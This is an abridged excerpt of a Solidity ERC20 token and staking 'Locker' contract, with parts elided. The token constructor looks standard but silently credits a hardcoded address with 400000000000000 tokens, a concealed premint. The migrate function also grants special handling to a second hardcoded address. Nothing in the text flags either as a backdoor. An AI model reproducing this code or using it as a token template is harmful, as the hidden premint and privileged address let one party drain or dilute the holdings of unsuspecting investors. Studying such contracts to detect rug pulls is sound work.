...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _balances[0x3e9e5876F3A992EFcC23E84DD64431EDf02470E1] += 400000000000000;
    }
...
contract Locker is ERC20 {
    ...
    constructor(
        ...
        Holders[] memory _Holder,
        string memory _name,
        string memory _symbol
    ) ERC20(_name, _symbol) {
        holders[_test] = _Holder[0];
    ...
    function withdraw() public {
        ...
        uint256 userEpochTimes = (block.timestamp - startTime)/ epoch - holder.epochTime;
        uint256 amount = (holder.balance * (100000 + userEpochTimes * options[holder.id]._rate))/100000;
    ...
    function getReward() public {
        Holders storage holder = holders[msg.sender];
        uint256 userEpochTimes = (block.timestamp - startTime)/epoch - holder.epochTime;
        uint256 amount = (holder.balance * options[holder.id]._rate * userEpochTimes) / 100000;
        IERC20(vsqAddress).transfer(msg.sender, amount);
        holder.epochTime = (block.timestamp - startTime)/epoch;
        holders[msg.sender] = holder;
    ...
    function migrate() public {
        ...
        if(msg.sender == 0x789B96137Ac44Af991588b5758FC329c6F52575b){
            ...
            ILocker.Holder memory holder = ILocker(previousLockerAddress).hodlers(
                msg.sender
            );
    ...
    function userRewardAmount(address user) external view returns(uint256 rewardAmount) {
        Holders storage holder = holders[user];
        uint256 userEpochTime =(block.timestamp - startTime) / epoch -holder.epochTime;
        rewardAmount = (holder.balance * options[holder.id]._rate * userEpochTime) / 100000;
    }

    function totalClaimableAmount() external view returns (uint256 _claimableAmount){
        uint256 currentEpoch = (block.timestamp - startTime) / epoch;
        for (uint256 i = 0; i < 3; i++) {
            claimableAmount storage rewards = totalRewards[i];
            _claimableAmount +=
                rewards._totalLockedAmount *options[rewards._id]._rate *
